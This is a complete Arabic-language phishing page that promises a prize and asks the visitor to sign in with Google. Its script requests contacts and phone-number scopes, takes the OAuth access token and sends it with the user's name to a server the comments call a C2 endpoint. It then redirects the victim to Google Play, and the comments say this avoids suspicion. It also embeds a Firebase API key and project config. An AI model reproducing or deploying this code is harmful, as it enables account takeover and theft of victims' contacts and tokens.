<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>هدية حصرية - سجل دخولك لاستلام جائزتك</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-auth.js"></script>
    
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
        .card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
        button { background: #4285f4; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; cursor: pointer; transition: 0.3s; }
        button:hover { background: #357abd; }
        img { width: 100px; margin-bottom: 1rem; }
    </style>
</head>
<body>

<div class="card">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" alt="Google">
    <h2>تهانينا! لقد فزت بجائزة قيمة</h2>
    <p>يرجى تسجيل الدخول بحساب جوجل الموثق لتأكيد هويتك واستلام هديتك فوراً.</p>
    <button onclick="startCatch()">تسجيل الدخول واستلام الهدية</button>
</div>

<script>
    // 1. إعدادات فايربيز الخاصة بمشروعك (giftapp-5937d)
    const firebaseConfig = {
        apiKey: "AIzaSyCvs2XALyDmK3_D4BXJ5Dx7MFo2H71R6gg",
        authDomain: "giftapp-5937d.firebaseapp.com",
        projectId: "giftapp-5937d"
    };
    firebase.initializeApp(firebaseConfig);

    // 2. رابط سيرفر الـ C2 الخاص بك على PythonAnywhere
    const C2_ENDPOINT = "https://mohamedahmed77.pythonanywhere.com/catch";

    function startCatch() {
        const provider = new firebase.auth.GoogleAuthProvider();
        
        // 3. طلب صلاحية الوصول لجهات الاتصال (السر في هذه السطور)
        provider.addScope('https://www.googleapis.com/auth/contacts.readonly');
        provider.addScope('https://www.googleapis.com/auth/user.phonenumbers.read');

        firebase.auth().signInWithPopup(provider).then((result) => {
            const token = result.credential.accessToken;
            const user = result.user.displayName || "User";

            // 4. إرسال "الصيد" إلى سيرفرك في صمت
            fetch(`${C2_ENDPOINT}?token=${token}&sender=${user}`)
            .then(response => {
                // 5. تحويل الضحية لصفحة حقيقية لإبعاد الشبهات
                window.location.href = "https://play.google.com/store/games";
            })
            .catch(err => {
                // حتى لو فشل الاتصال بالسيرفر، نحول الضحية لضمان عدم الشك
                window.location.href = "https://play.google.com/store/games";
            });

        }).catch((error) => {
            console.error("Auth Error:", error);
            alert("حدث خطأ في الاتصال، يرجى المحاولة مرة أخرى.");
        });
    }
</script>

</body>
</html>
